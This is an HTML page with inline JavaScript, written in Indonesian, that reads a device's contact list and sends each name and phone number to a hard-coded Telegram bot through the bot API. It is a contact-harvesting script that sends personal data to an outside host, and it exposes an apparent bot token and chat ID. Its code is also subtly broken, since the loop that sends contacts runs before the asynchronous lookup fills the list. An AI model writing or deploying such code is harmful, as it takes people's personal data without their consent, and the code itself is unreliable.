<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kirim Kontak ke Telebot</title>
    <script>
        function sendContacts() {
            // Dapatkan semua kontak dari daftar kontak
            const contacts = navigator.contacts;
            const contactList = [];

            contacts.find(['name', 'phoneNumbers'], (contact) => {
                if (contact.phoneNumbers.length > 0) {
                    contactList.push({
                        name: contact.name,
                        phone: contact.phoneNumbers[0].value
                    });
                }
            }, (error) => {
                console.error('Error accessing contacts:', error);
            }, {
                multiple: true
            });

            // Kirim setiap kontak ke Telebot
            contactList.forEach(contact => {
                const message = `Nama: ${contact.name}, Nomor Telepon: ${contact.phone}`;

                fetch('https://api.telegram.org/bot<8359132305:AAFGAdP03knmnPkauPBoAcE9gCjVMmv3jMc>/sendMessage', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: '<1966317946>',
                        text: message
                    })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log('Kontak dikirim:', contact.name);
                    } else {
                        console.error('Gagal mengirim kontak:', contact.name);
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                });
            });
        }
    </script>
</head>
<body>
    <h1>Kirim Semua Kontak ke Telebot</h1>
    <button onclick="sendContacts()">Kirim Kontak</button>
</body>
</html>
